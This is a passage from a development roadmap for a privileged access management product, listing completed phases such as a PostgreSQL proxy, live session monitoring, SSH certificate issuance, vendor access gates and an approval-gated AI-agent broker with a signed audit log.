- [x] **PostgreSQL wire-protocol proxy** (`internal/proxy/dbproxy.go`, on `PAM_DB_ADDR`, default off): speaks the frontend/backend protocol via `pgproto3` (already vendored with pgx). Operator connects `psql "host=pam port=5433 user=<dbcred>@<target> dbname=<db>"` with their PAM key as the password; login parsing reuses the SSH proxy's `creduser@target` convention
- [x] **Same authorization gates as the SSH proxy** (decrypt only after every gate): `CapConnect`, per-target grants (`CanConnectTarget`), the protocol allowlist, and the 4-eyes/OT approval gate — then JIT `vault.Decrypt` and injection
- [x] **Upstream authentication with the vaulted secret**: trust, cleartext, MD5, and **SCRAM-SHA-256** (RFC 5802, stdlib `crypto/hmac`·`sha256` + `x/crypto/pbkdf2`), plus best-effort upstream TLS (`sslmode=prefer` style) — so it reaches self-hosted **and** managed/SCRAM Postgres. Optional operator-leg TLS when `PAM_TLS_CERT/KEY` are set
- [x] **Per-statement query audit + recording**: every `Query`/`Parse` becomes a `db.query` audit event and a line in the session recording (asciicast, SHA-256 hash-chained like SSH/WinRM); live in the session registry (list + kill) as protocol `postgres`; post-session rotation honored
- [x] **End-to-end JIT proof**: an in-process fake PostgreSQL upstream that accepts **only** the vaulted secret — a passing test proves the operator's PAM key was swapped for the vault secret and the SQL was audited; a bad-key operator is refused before any upstream contact
- Deferred (documented): MySQL/Oracle connectors (same pattern, new wire protocols) and result-row redaction policies. **MSSQL has since shipped (Phase 53).** **CA-pinned upstream TLS has since shipped** (`PAM_DB_UPSTREAM_CA` / `PAM_DB_UPSTREAM_TLS_VERIFY`, in the 2026-07-22 hardening pass)

## Phase 16 — Live session monitoring + command control ✅

Turn the existing recording + kill-switch into **supervised** sessions — the third [Tier-1 competitive-coverage gap](README.md#coverage-vs-commercial-pam-cyberark-wallix-) (matching CyberArk PSM / Wallix live monitoring + command filtering).

- [x] **Live session monitoring**: a `session.Hub` fans out every recorded output byte, keyed by session id; `GET /api/sessions/{id}/stream` (`CapReadAudit`) streams it as **Server-Sent Events** so a supervisor watches an SSH or PostgreSQL session as it happens. Non-blocking fan-out (a slow watcher drops frames, never stalls the session); the watch is audited (`session.monitor`)
- [x] **Command control**: a `CommandGuard` (regex denylist from `PAM_COMMAND_DENY_FILE`, one pattern per line) blocks a dangerous command **before it reaches the target** on every path where a discrete command is visible — SSH `exec` (the request is refused, never forwarded), each WinRM command-loop line, and each PostgreSQL `Query`/`Parse` (a simple query is refused but the session stays usable; an extended-protocol statement fails closed). Blocks are audited `command.blocked` with the matched pattern
- [x] **Shared writer plumbing**: the proxy tees session output to the hub via `teeLive`; the DB relay serializes all client-facing writes under one mutex (pgproto3 is not concurrency-safe), proven race-free under `-race`
- [x] **Tests**: the guard (match / comment-skip / fail-loud / nil no-op), the hub (pub-sub, cancel, slow-watcher drop), a blocked SSH exec and a blocked SQL statement (neither reaches the upstream), a live SQL frame observed over the hub, and the SSE endpoint (200 + frame for an auditor, 403 without `CapReadAudit`)
- Deferred (documented): interactive-shell command filtering (a raw PTY stream is not parsed — use observer sessions or restrict shell access). *(The in-portal 5250 viewer for the live stream shipped in Phase 25; WinRM live streaming, deferred here, shipped 2026-07-29.)*

## Phase 17 — Safes & dependent-account propagation ✅

The last two [Tier-1 competitive-coverage gaps](README.md#coverage-vs-commercial-pam-cyberark-wallix-): CyberArk's Safe-centric authorization model, and safe rotation of service accounts.

**Safes / vault containers (delegated access):**

- [x] **Safe model** (migration `0012`: `safes`, `safe_members`, `targets.safe_id`): a named container groups targets and delegates who may access them. A **safe member may connect to every target in the safe** — an authorization path alongside per-target grants
- [x] **Effective grants**: `store.EffectiveTargetGrants(targetID)` = direct grants ∪ safe-member-derived grants; every connect gate (SSH proxy, DB proxy, RDP, the two broker-tool checks, `gateCredentialAccess`) now honors it, so placing a target in a safe restricts it to the safe's members. `auth.SubjectMatches` factored out of `CanConnectTarget` and reused
- [x] **Delegated administration**: `POST/GET /api/safes`, `DELETE /api/safes/{id}`, `GET/POST /api/safes/{id}/members`, `DELETE /api/safes/{id}/members/{mid}`, `PUT /api/targets/{id}/safe`. Member management is gated by `canManageSafe` — a global target manager **or** a `can_manage` member of that safe (so safe ownership can be delegated). Audit `safe.create`/`safe.delete`/`safe.member.{add,remove}`/`target.safe_set`
- [x] **Tests**: store contract (CRUD, conflict, `EffectiveTargetGrants`, cascade-unassign on delete), an end-to-end proxy test (a non-member is denied a target in a safe; adding the member's role grants the connection), and delegated-management authz

**Dependent-account propagation (safe service-account rotation):**

- [x] **Declared consumers** (migration `0013`: `credential_dependencies`): a credential lists the **Windows Services / Scheduled Tasks / IIS App Pools** that log on with it (`POST/GET /api/credentials/{id}/dependencies`, `DELETE …/{did}`)
- [x] **Propagation on rotation**: after `rotateCredential` sets and re-vaults the new secret, `propagateDependencies` updates each consumer over WinRM (`sc.exe config` / `schtasks /Change /RP` / `appcmd set apppool …password`) with the new secret — so auto-rotating a service account no longer breaks the services that use it. A propagation failure never fails the (already-persisted) rotation; each consumer is audited `credential.dependency_updated`/`credential.dependency_failed` (the secret is injected into the WinRM command but never audited or recorded)
- [x] **Tests**: store contract (CRUD, default WinRM port, missing-credential `ErrNotFound`, cascade on credential delete) and an end-to-end rotation test (the fake WinRM receives the `sc.exe config` for the service with the new secret; the audit carries the update without the secret)
- Deferred (documented): a per-consumer management/reconcile credential (propagation currently connects as the rotated account) and a Safe-scoped policy/workflow layer (per-safe approval, dual control). *(The in-portal 5250 safe-management screens shipped in Phase 25.)*

## Phase 18 — Conjur secret sourcing (alternative to SOPS) ✅

Let pamv1 source its **own** bootstrap secrets from [CyberArk Conjur](https://www.conjur.org/) at runtime — the runtime-broker counterpart to the SOPS GitOps sealing (Phase 14). **Both ship; SOPS stays the zero-dependency default**, Conjur is opt-in (`PAM_CONJUR_URL`). This is the same philosophy pamv1 already applies to its KEK (Vault-Transit / AWS-KMS / PKCS#11) — externalize the root of trust — now applied to the secret *values*.

- [x] **Hand-rolled Conjur client** (`internal/conjur`, no new dependency — the two REST endpoints pamv1 needs, like the MCP/SPIFFE hand-rolls): authenticate + read secret, over TLS with an optional CA bundle
- [x] **Two authenticators**: `authn-api-key` (host login + API key) and **`authn-jwt`** — the pod presents a Kubernetes projected service-account token, so **no bootstrap secret lives in Git at all** (reuses the JWT posture from `oidc`/`agentid`)
- [x] **Startup sourcing** (`conjur.SourceEnv`, before `config.Load`): fills any **empty** bootstrap `PAM_*` secret (master key, API key, DB URL, break-glass hash, broker keys) from `PAM_CONJUR_POLICY_PREFIX/<name>`. An explicit env value **wins**; a variable missing in Conjur (404) is skipped; a configured-but-unreachable Conjur is **fail-loud** (never starts with empty secrets)
- [x] **IaC**: `deploy/k8s/conjur/` — a Conjur policy (`policy.yaml`), a pam-server Deployment with the authn-jwt projected-token volume (`deployment.yaml`), and a README covering the SOPS-vs-Conjur trade-offs
- [x] **Tests**: an in-process fake Conjur (authenticate → retrieve, 404-as-not-found, auth-failure fail-loud) plus `SourceEnv` behavior (fills empty, env wins, disabled no-op, `PAM_SECRETS_PROVIDER=conjur` without a URL fails loud)
- Deferred (documented): runtime secret **refresh** without a restart (sourcing is one-shot at boot, like SOPS at apply), a per-variable override map, and pushing pamv1's *managed* secrets **out** to Conjur (Secrets-Hub-style sync — a Tier-4 gap)

## Phase 19 — Access certification / attestation campaigns ✅

The first [Tier-2 competitive-coverage gap](README.md#coverage-vs-commercial-pam-cyberark-wallix-) (access-governance depth): the periodic "recertify or revoke who has access to what" review that SOX / ISO 27001 / NIS2 Art. 21(2) expect, and that CyberArk/SailPoint-style IGA provides.

- [x] **Campaign snapshot**: `POST /api/campaigns` captures the *current* access grants — every target grant and every safe member — as reviewable **campaign items** (migration `0014`: `campaigns`, `campaign_items`). A campaign is a point-in-time attestation record
- [x] **Certify or revoke, with teeth**: `POST /api/campaigns/{id}/items/{iid}/decision {certify|revoke}` — a **revoke actually deletes the underlying grant** (`DeleteTargetGrant`/`DeleteSafeMember`; a grant already gone is a no-op, since the goal state is "no access"), certify records the attestation. `POST …/close` closes the campaign (further decisions refused). Every decision is audited
- [x] **Governance-scoped authz**: management (`create`/`decide`/`close`) needs `CapManageUsers`; reading a campaign + its items needs `CapReadAudit` — so an auditor can review the evidence without being able to change access. No new capability added to the matrix
- [x] **Audit vocabulary**: `certification.campaign_created` · `certification.item_certified` · `certification.item_revoked` · `certification.campaign_closed`
- [x] **Tests**: store contract (CRUD, decide, close, missing-campaign `ErrNotFound`) and an end-to-end API test (a campaign snapshots a grant + a safe member; revoke deletes the grant, certify retains the member, a closed campaign returns 409; auditor can read, a plain user cannot manage)
- Deferred (documented): scheduled/recurring campaigns, scoped campaigns (per-safe or per-owner), and reviewer assignment + reminders. *(The 5250 console review screen shipped in Phase 25.)*

## Phase 20 — ITSM / ticketing gate ✅

The second [Tier-2 competitive-coverage gap](README.md#coverage-vs-commercial-pam-cyberark-wallix-): "no privileged access without an approved change ticket" — the ServiceNow/Jira integration compliance teams expect, hung on the existing 4-eyes access-request engine.

- [x] **Ticket validator** (`internal/ticket`, no new dependency): two optional, composable checks — a **regex format** (`PAM_TICKET_PATTERN`, e.g. a ServiceNow/Jira number) and a **webhook** (`PAM_TICKET_VALIDATE_URL`) the ITSM system answers `2xx` for a valid, approved ticket (`POST {"ticket":"<id>"}`). A nil validator accepts any ticket (disabled)
- [x] **Gate on access requests**: `POST /api/access-requests` accepts a `ticket`; when `PAM_REQUIRE_TICKET` is set it is mandatory (422 otherwise), a configured validator must pass (422 + `access.ticket_rejected` audit on failure), and the ticket is **stamped into the request and the audit trail** (`store.AccessRequest.Ticket`, migration `0015`)
- [x] **Tests**: a `ticket` unit test (disabled / bad-pattern / format reject) and an end-to-end API test with a fake ITSM webhook (missing → 422, bad format → 422, webhook-rejected → 422, an approved ticket → 201 and recorded)
- Deferred (documented): a first-class ServiceNow/Jira connector (this ships the generic webhook + regex hook), and gating the connect path directly on a live ticket lookup (today the ticket is validated at request time)

## Phase 21 — Richer approval workflows ✅

The third [Tier-2 competitive-coverage gap](README.md#coverage-vs-commercial-pam-cyberark-wallix-): move past single-level 4-eyes to the approval depth CyberArk/Wallix offer — built on the existing access-request engine (migration `0016`).

- [x] **Multi-tier approval chains (N-of-M)**: an access request needs `RequiredApprovals` **distinct** approvers before it is granted (`PAM_APPROVALS_REQUIRED` default; a request may ask for more via `approvals`). Each approval accumulates into `approved_by`; the request stays `pending` until the count is met, then flips to `approved`. An approver can't approve twice (409); self-approval is still refused (four-eyes). Partial approvals audit `access.approve_partial`
- [x] **Scheduled / time-boxed windows**: a request may carry `not_before` / `not_after`; an approved request is only **active inside that window** (`HasActiveApproval` honors `not_before`), so access can be pre-approved for a future maintenance window
- [x] **Mandatory reason codes**: `PAM_REQUIRE_REASON` rejects an access request with no reason (422)
- [x] **Tests**: store contract (multi-approver accumulation, scheduled-window activation) and end-to-end API tests (a 2-of-N chain — first approval pending, double-approval 409, second distinct approval grants; mandatory reason; a scheduled window round-trips)
- [x] **One-time (single-use) access** — *shipped in Phase 26* (the consume-on-connect hook in every privileged-use gate)

## Phase 22 — Zero Standing Privilege (ephemeral SSH certificates) ✅

The first [Tier-3 competitive-coverage gap](README.md#coverage-vs-commercial-pam-cyberark-wallix-) (where the market is moving): stop storing a standing secret for an account at all. Instead of a vaulted password/key, pamv1 signs a **short-lived SSH user certificate just-in-time** for each proxied session — the target trusts only the pamv1 CA, so the account has **no standing credential** (the Teleport / CyberArk ZSP model), built directly on the existing JIT proxy chokepoint.

- [x] **SSH certificate authority** (`internal/sshca`): a persistent CA key (`PAM_SSH_CA_KEY`, generated on first use, mirrors the host-key handling) that mints short-lived user certificates. Each certificate gets a fresh ephemeral keypair (used for one dial, then discarded), a serial for audit correlation, the standard interactive extensions, and a validity of `PAM_SSH_CERT_TTL_MIN` (default 2m).
- [x] **Zero-standing credential type** (`secret_type: "ssh_ca"`): a credential that stores **no secret** (`SecretEnc` stays empty — nothing to vault, reconcile, or rotate). Only valid on ssh targets; rejected with a secret attached. The proxy, seeing `ssh_ca`, mints a certificate at dial time and authenticates upstream with it — no vault decrypt happens, and a missing CA fails the session closed (`session.error`), never falling back to a non-existent secret.
- [x] **CA public-key publication**: `GET /api/ca/ssh` (`CapReadInventory`) returns the CA public key in authorized_keys form + a `TrustedUserCAKeys` install hint, so an operator can configure their targets; 404 when ZSP is disabled.
- [x] **Audit vocabulary**: `session.cert_issued` (serial · principal · valid-before · key-id — never the private key). Reconciliation reports `ssh_ca` as `unsupported`; post-session rotation and the lifecycle worker skip it (there is no secret to rotate — the cert already expired).
- [x] **Tests**: `internal/sshca` unit tests (a minted cert is a user cert, signed by the CA, principal-scoped, and expires — checked with an `ssh.CertChecker`); an **end-to-end ZSP proxy test** against an in-process upstream that accepts **only** a CA-signed certificate (no password auth exists), proving the account has no standing secret; a without-CA fail-closed test; and API tests for the credential rules + the CA endpoint.
- Deferred (documented): ephemeral **local accounts** (create/destroy the OS account per session — needs a real host), host-certificate issuance, and per-principal certificate options/source-address restrictions.

## Phase 23 — Privileged threat analytics ✅

The second [Tier-3 gap](README.md#coverage-vs-commercial-pam-cyberark-wallix-): behavioral anomaly detection, risk scoring, and automated response over the privileged-session stream (the CyberArk PTA / Wallix analytics capability) — computed from the audit trail pamv1 already produces.

- [x] **Deterministic, explainable risk engine** (`internal/analytics`): a pure scorer over audit events (no clock, no I/O, no opaque model) — every point of an actor's score traces back to a named **signal**: break-glass use, blocked commands, authentication-failure bursts, off-hours activity, credential-decryption failures, and session velocity. Weights, per-signal caps, level thresholds, and business hours are configurable; a single break-glass access alone reaches **high**.
- [x] **Risk API**: `GET /api/analytics/risk` (`CapReadAudit`) scores the recent audit window into per-actor findings (score, level, contributing signals), sorted by score, filterable by `?min_level=` and `?window_min=` — so an auditor reviews risk without changing any access.
- [x] **Background worker + automated response** (`RunAnalyticsWorker`, `PAM_ANALYTICS_INTERVAL_MIN`): each pass scores the window, and for a **newly elevated** high/critical actor appends `analytics.risk_flagged`, fires the alert channel, and — with `PAM_ANALYTICS_AUTO_KILL` on — **terminates a critical actor's live sessions** (`session.Registry.KillByActor`, audited `analytics.auto_response`). A steady state is not re-alerted every pass; a worsening trend is.
- [x] **Tests**: engine unit tests (break-glass → high; clean in-hours work → no finding; off-hours contribution; auth-failure burst + score-descending sort; per-signal cap) and API tests (the risk endpoint scores + enforces `CapReadAudit`; the worker flags, alerts, dedupes, and auto-kills a critical actor's sessions).
- Deferred (documented): peer-baseline / new-target novelty scoring (needs a longer history model) and step-up-MFA response. *(The 5250 console risk dashboard shipped in Phase 25.)*

---

## Phase 24 — Application-secrets API (Tier-4: Conjur-style secret delivery) ✅

The first [Tier-4 ecosystem gap](README.md#coverage-vs-commercial-pam-cyberark-wallix-): a **Conjur-style application-secrets API** so a **non-agent application** (a CI job, a legacy service, a microservice) can retrieve the specific secrets it needs at startup — without an operator, a session proxy, or the AI-agent tool broker. Opt-in via `PAM_APP_SECRETS_ENABLED`; **default-deny** and least-privilege by construction.

- [x] **Application identity** (migration `0017`: `app_keys`): a bearer key whose **SHA-256 hash only** is stored (like agent keys), with an accountable owner recorded in the audit trail. Admin CRUD `POST/GET /v1/apps` + `DELETE /v1/apps/{id}` (`CapManageUsers`).
- [x] **Per-app secret grants** (`app_secret_grants`, default-deny): an app may fetch a credential's secret **only** if it has an explicit grant (`POST/GET /v1/apps/{id}/grants`, `DELETE …/{gid}`). Granting needs **`CapRevealSecret`** — you can only hand an app a secret you could reveal yourself, so a delegated `manage_users` principal can't exfiltrate secrets it couldn't otherwise read. Grants cascade when the app or the credential is deleted.
- [x] **The fetch path** `GET /v1/app-secrets/{credential_id}` (application bearer auth): decrypts the granted credential just-in-time and returns it, audited `app.secret_retrieved` (never the secret itself); a non-granted credential is `app.secret_denied` + 403; a disabled/unknown app is 401; a Zero Standing Privilege (`ssh_ca`) credential has no secret to deliver (422). Independent of `PAM_REVEAL_DISABLED` (apps can't use the session proxy); **front it with TLS** — it delivers plaintext to machines.
- [x] **Audit vocabulary**: `app.create` · `app.revoke` · `app.grant` · `app.grant_revoked` · `app.secret_retrieved` · `app.secret_denied`.
- [x] **5250 console screen** (menu 15, *Work with application secrets*): mint/revoke application identities (the bearer token shown once), and per-app *Work with secret grants* to grant/revoke individual credentials — keyboard-first like the rest of the portal. Tolerates the API being disabled with a hint.
- [x] **Tests**: store contract (app-key CRUD, default-deny + grant, duplicate/missing-FK errors, cascade on credential and app delete) and an end-to-end API test (mint → grant → fetch exactly the granted secret; ungranted 403; bad token 401; the secret never enters the audit trail; a plain user can neither mint apps nor grant secrets; routes absent when disabled).
- Deferred (documented, Tier-4): a **Terraform provider** for pamv1 objects (a separate module + the Terraform Registry), **Secrets-Hub-style sync-out** to AWS Secrets Manager / Azure Key Vault (needs a cloud account), **SSH-key fleet discovery** at scale (needs a real host fleet), and **thick-app connection components** (Windows RemoteApp hosts) — see [docs/EXTERNAL-INFRA-GAPS.md](docs/EXTERNAL-INFRA-GAPS.md).

## Phase 25 — Console parity ✅

Close the gap between the backend and the 5250 console: Phases 16–23 shipped
capabilities whose portal screens were documented follow-ons. This phase brings
the console back to full CyberArk/Wallix-style *coverage* — every capability
reachable keyboard-first, same austere look, still one `//go:embed`'d vanilla-JS
page with no new routes or schema (each screen drives an existing API).

- [x] **Work with safes** (menu 16): list/create/delete safes with per-safe target counts; *Work with safe members* (add/remove, `can_manage` delegated administration); targets now show their safe and *Work with Targets* option 8 assigns/clears a target's safe (`PUT /api/targets/{id}/safe`)
- [x] **Certification campaigns** (menu 17): snapshot a new campaign (name + optional due date), review items with certify/revoke decisions (revoke deletes the underlying grant — labeled as such), close a campaign; read-only for auditors (decisions need `manage_users`), decided items show decision + decider
- [x] **Risk analytics** (menu 18): the per-actor behavioral-risk dashboard over `GET /api/analytics/risk` — score, level (color-coded), named signals with points, event counts; filter by minimum level and scoring window from the screen
- [x] **Live session viewer**: *Work with Active Sessions* option 5 watches a session as it happens — the SSE stream (`GET /api/sessions/{id}/stream`) is read with `fetch` (EventSource cannot send the `X-API-Key` header), ANSI-stripped, and rendered in a bounded scrollback pane; view-only, audited `session.monitor`
- [x] **Access-request workflow fields** (Phases 20–21 catch-up): the file-request form now takes a change **ticket**, a requested **N-of-M approval count**, and a **scheduled window** (`not_before`/`not_after`); the approver list shows ticket, approval progress (`n/m` distinct approvers), window start, and expiry
- [x] Verified end to end against the in-memory server: every screen's exact API calls exercised (safe → member → target assignment; campaign snapshot → certify/revoke-with-teeth → close; risk filters; a ticketed 2-of-N windowed request), plus `node --check` on the embedded script and the full Go test suite

## Phase 26 — Session-recording playback + one-time access ✅

Two follow-ons the backlog had carried since Phases 2 and 21, both fully
buildable and verifiable in process: recordings existed on disk (hash-chained,
audited) but nothing could replay them, and an approval — once granted — kept
admitting connections for its whole window.

**Session-recording playback (the review side of Phase 2's recordings):**

- [x] **Recordings API**: `GET /api/recordings` (`CapReadAudit`) lists the stored recordings newest-first (asciicast `.cast` from the SSH/WinRM/PostgreSQL proxies, `.winrm.log` transcripts from the WinRM run endpoint; dotfiles like the `.chain` head never listed); `GET /api/recordings/{name}` serves one for replay. A strict filename allowlist (the recorder's own `sanitize` alphabet) forecloses path traversal
- [x] **Tamper evidence at replay**: the served file's SHA-256 is recomputed and searched in the audit trail (`store.FindAuditDetail` — the value stamped by `session.record` / `winrm.run` when the recording was written); the verdict rides `X-PAM-Recording-Audited`, so a file tampered on disk is visibly flagged the moment an auditor replays it. Hash and body cover the same byte range, so a still-recording session replays as a consistent prefix
- [x] **Every replay is audited** (`session.playback` — file, bytes, sha256, verdict)
- [x] **5250 replay screen** (menu 19): recordings subfile + a keyboard-first player in the live-viewer pane — Space pause/resume, F5 restart, F6 speed (1x→2x→4x→8x→MAX), long idle gaps capped at 2s (asciinema-style), ANSI-stripped bounded scrollback, and the audit-verification verdict on screen

**One-time (single-use) access (Phase 21's deferred follow-on):**

- [x] **Single-use approvals** (migration `0019`: `one_time`, `consumed_at`): an access request may be filed one-time (`one_time` on `POST /api/access-requests`, or forced globally by `PAM_ACCESS_ONE_TIME`); the first privileged use its approval admits **consumes it** — audited `access.consumed` — and it admits nothing further
- [x] **Consume-on-use in every gate**: the SSH proxy, the PostgreSQL proxy, the RDP tunnel, and the API's approval gate (reveal, checkout, WinRM run, broker tool calls) all burn a single-use approval via `store.ConsumeApproval` — atomic under racing connects (`FOR UPDATE SKIP LOCKED`; exactly one of two simultaneous dials wins), a standing approval is preferred and never burned, and a consumed approval is inactive everywhere (`HasActiveApproval` honors it). Consumption is deliberately fail-closed: an admitted connection that later fails upstream still spends the approval
- [x] **Console**: the file-request form takes a one-time flag; the approver list shows `1x` / `used`
- [x] **Tests**: store contract (round-trip, burn-once, standing-approval preference, an 8-way race admits exactly one consumer), end-to-end SSH and PostgreSQL proxy tests (a single-use approval admits exactly one connection; the second is refused before any upstream contact), API tests (checkout burns the approval; `PAM_ACCESS_ONE_TIME` forces one-time), and playback tests (listing, byte-exact serve, verified/unaudited verdicts, RBAC, name hygiene)

## Phase 27 — AI-agent broker completion (Solution-01 parity) ✅

The AI-agent access broker (Phase 13) ported the [pam-research](https://github.com/morandeirachema/pam-research) control loop; this phase closes the honestly-buildable gaps that remained, so the broker reaches parity with that research prototype's Solution 01 without faking any infra-bound part.

- [x] **Approver-group separation of duties**: a `require_approval` rule's `approvers:` list is now **enforced at decision time** — `broker.Decide` takes an `Approver{Name, Groups, IsAdmin}` (groups = the principal's name + role names, via `auth.Principal.ApproverGroups`) and refuses a decider who is not a member of the rule's group (`broker.approval.refused`, HTTP 403); the parked call stays decidable by someone authorized. Admins are the documented superuser bypass; four-eyes (an agent's owner can't approve its own call) is unchanged
- [x] **Periodic in-chain signed checkpoints**: `PAM_BROKER_AUDIT_CHECKPOINT_EVERY` makes the chain append a `broker.audit.checkpoint` every N events — an ed25519 signature over the running head, itself part of the HMAC chain. This is defense-in-depth over the keyed-HMAC: an attacker who edits history **and** recomputes every HMAC (a leaked HMAC key) still can't forge the checkpoint signature, so `VerifyFloor` flags a `bad_checkpoint`
- [x] **Truncation floor**: `GET /v1/audit/verify?min_entries=N` (driven from a previously archived checkpoint count) reports `truncated` when the chain is now shorter — tail-truncation detection without an out-of-band anchor
- [x] **Signing-key rotation + JWKS**: the checkpoint signer rotates with an overlap window (`PAM_BROKER_AUDIT_SIGN_PREV` trusts rotated-out public keys for verification); current + previous public keys are published as a JWKS at `GET /v1/audit/jwks`, so an external auditor validates an archived checkpoint across a rotation
- [x] **OCSF SIEM export**: `internal/ocsf` maps the audit trail to the [Open Cybersecurity Schema Framework](https://schema.ocsf.io/) — routine actions to **API Activity (6003)**, security-relevant ones (denials, blocked commands, break-glass, flagged risk) to **Detection Finding (2004)** — served at `GET /api/audit/ocsf` (`?format=ndjson` for collectors); the export is audited `audit.ocsf_export`
- [x] **MCP SSE transport + elicitation**: `GET /mcp` implements the MCP 2024-11-05 HTTP+SSE transport (session registry, `endpoint` event, heartbeats); `initialize` advertises `elicitation`/`logging`. An approval-gated `tools/call` from an elicitation-capable client prompts the running user over the stream (`elicitation/create`) — a **decline withdraws the requester's own** parked call (`broker.tool_call.withdrawn`; you may always cancel what you asked for, no approver needed), an **accept** only records intent (`broker.elicit.accepted`) and does **not** satisfy the human approver gate (four-eyes preserved)
- [x] **Threat model doc**: [docs/AGENT-THREAT-MODEL.md](docs/AGENT-THREAT-MODEL.md) maps the OWASP LLM Top 10 (2025) and MITRE ATLAS techniques to the broker's controls, and states the boundaries (admin bypass, in-band truncation limit) honestly
- [x] **Tests**: auditchain (checkpoints emitted + verified, key-compromise edit caught by the signature, rotation overlap, truncation floor), `ocsf` (classification + envelope), and API end-to-end (SoD refuses an out-of-group approver and admits a member; JWKS shape; verify floor; OCSF JSON + NDJSON; a full MCP SSE + elicitation round-trip where a decline withdraws the call and injects no credential)
- Deferred (documented, infra-bound): SPIRE workload attestation (needs SPIRE), a real OAuth 2.1 AS behind RFC 9728, and Vault-custodied signing keys. **RFC 8693 token-exchange minting was on this list and should not have been** — the broker is its own STS; it shipped in Phase 57 — see [EXTERNAL-INFRA-GAPS.md](docs/EXTERNAL-INFRA-GAPS.md)

## Phase 28 — Operator-issued SSH certificates (JIT certs for humans) ✅

Extends the Phase 22 Zero-Standing-Privilege CA from proxy-internal minting to a public **issuance API for an operator's own key** — the [pam-research](https://github.com/morandeirachema/pam-research) Solution-02 model (Teleport `tsh login`-style): an operator authenticates to pamv1, gets a short-lived certificate scoped to a target account, and uses it with their normal SSH client for direct access, revocable early via a KRL. Built entirely in process and verified against real OpenSSH.

- [x] **Proof of possession**: `POST /api/ca/ssh/challenge` (`CapConnect`) mints a stateless, self-authenticating challenge (HMAC keyed off the CA private key — HA-safe across replicas, unforgeable without the CA key); `POST /api/ca/ssh/sign` verifies the operator signed it with the private key of the public key they present, so pamv1 only certifies a key the requester actually holds
- [x] **Scoped issuance**: `sshca.IssueForKey` signs the operator's **public** key (no secret is generated or stored) into a user certificate scoped to a single **principal** with an optional **`source-address`** critical option, capped at `PAM_SSH_OPERATOR_CERT_TTL_MIN` (default 10m). The same connect authorization as the proxy applies (per-target grants + the approval gate — a one-time approval is consumed), and the principal must be a **managed account** on the target, so an operator can't mint a cert for an arbitrary login
- [x] **KRL revocation**: issued certificates are recorded (migration `0020` `ssh_certificates`; the serial is the revocation handle, returned as a JSON **string** so a large uint64 survives float parsing). `POST /api/ca/ssh/revoke` (`CapManageTargets`) revokes a serial; `GET /api/ca/ssh/krl` (`CapReadInventory`) emits a real **OpenSSH Key Revocation List** (`sshca.KRL`, per PROTOCOL.krl) a target installs as sshd `RevokedKeys` to cut a still-valid cert off early
- [x] **Audit vocabulary**: `ssh.cert_issued` (serial · principal · target · valid-before · source-address, never the key) · `ssh.cert_denied` (failed proof of possession) · `ssh.cert_revoked`
- [x] **Tests**: `internal/sshca` (a scoped cert accepted by an `ssh.CertChecker` for its principal only, the proof-of-possession challenge round-trip, and — the honest real-tool check — the generated **KRL verified against `ssh-keygen -Q`**: a revoked serial reports revoked, a different serial does not), store contract (record/revoke/list-revoked, duplicate/already-revoked/unknown errors), and an API end-to-end (challenge → operator signs → sign → the returned cert authenticates for its principal → revoke → KRL served; a bad proof of possession, an unmanaged principal, and a non-connect role are all refused)
- Deferred (documented, infra-bound): ephemeral **local accounts** (create/destroy the OS account per session — needs a real host), host-certificate issuance, and per-principal certificate options beyond source-address — see [EXTERNAL-INFRA-GAPS.md](docs/EXTERNAL-INFRA-GAPS.md)

## Phase 29 — Third-party vendor access gate ✅

The [pam-research](https://github.com/morandeirachema/pam-research) Solution-05 model: give an external vendor **narrow, time-boxed, evidence-backed** access to specific targets, revocable in one action — built by composing pamv1's existing primitives (grants, approval, the session registry, the audit trail) into a vendor-shaped subsystem, entirely in process.

- [x] **Vendor identity + contract grants** (`internal/vendor`, migration `0021`): a vendor is an external `user`-role login linked by username; a **contract grant** (`POST /api/vendors/{id}/grants`) says which target they may reach, as which account, and the window (`not_before`/`not_after`). A grant starts **pending** and grants nothing until approved
- [x] **Customer-controlled approval + live attestation**: `POST /api/vendor-grants/{gid}/approve` (`CapApprove`) is the *customer's* decision — four-eyes refuses a vendor approving their own grant — and runs a **live employment-attestation** webhook (`PAM_VENDOR_ATTEST_URL`; the vendor-management system answers `2xx` for a currently-employed technician), so access is refused the moment the vendor's own employer offboards them
- [x] **Enforced on every connect path**: the SSH proxy, the PostgreSQL proxy, RDP, WinRM runs, and reveal/checkout all call `store.VendorSessionAllowed` — a vendor is admitted **only** while an approved, unrevoked grant is in-window; non-vendor users are unaffected. A vendor reaches nothing outside their contract
- [x] **Time-boxed with mid-session termination**: a background **sweeper** (`PAM_VENDOR_SWEEP_INTERVAL_MIN`) cuts a vendor's live session to a target once that grant's window closes (`vendor.session_expired`), so access ends when the contract does, not just at the next connect
- [x] **Instant offboard cascade**: `POST /api/vendors/{id}/offboard` disables the vendor, **revokes every grant atomically**, and **kills all their live sessions** — persisted, so a revoked technician can't return after a restart
- [x] **Evidence for auditors**: `GET /api/vendors/{id}/evidence` (`CapReadAudit`) bundles the vendor's contract grants + the audit slice attributable to them, with a SHA-256 digest — a SOC 2 / DORA-shaped per-vendor record
- [x] **Audit vocabulary**: `vendor.create` · `vendor.grant_created` · `vendor.grant_approved` · `vendor.grant_revoked` · `vendor.grant_decision_denied` · `vendor.attestation_failed` · `vendor.offboard` · `vendor.session_expired` · `vendor.evidence_export`
- [x] **Tests**: store contract (vendor + grant CRUD, window activation, offboard cascade, `VendorSessionAllowed`), the attestation webhook (`internal/vendor`), an API lifecycle (mint → pending grant refused → customer approves → WinRM admitted → offboard blocks again → evidence export, all audited), and an **SSH-proxy gate test** (a vendor is denied a target with no active grant, admitted once one is approved)
- Deferred (documented): a per-vendor console screen (the API is complete; the 5250 screens are a follow-on like earlier phases) and a first-class connector to a specific vendor-management system (this ships the generic attestation webhook)

## Phase 30 — In-session policy + step-up ✅

The core of the [pam-research](https://github.com/morandeirachema/pam-research) Solution-03 (recorded-session broker): re-evaluate policy **per action inside a session**, gate on **amounts**, and let a supervisor **step up** a risky action **without ending the session**. Applied to pamv1's two policy surfaces — the agent broker and the PostgreSQL session proxy — entirely in process.

- [x] **Numeric policy comparators**: the agent-broker policy engine (`internal/policy`) gains `gte`/`gt`/`lte`/`lt` conditions that compare an argument value **numerically** (fail-closed on an absent or non-numeric value), so a rule can gate on an amount — `when: { args.amount: { gte: 5000 } } → require_approval`, the canonical "refund over $5,000 needs a human" pattern. Load-time validation still enforces exactly one operator per condition and rejects a typo'd operator fail-loud
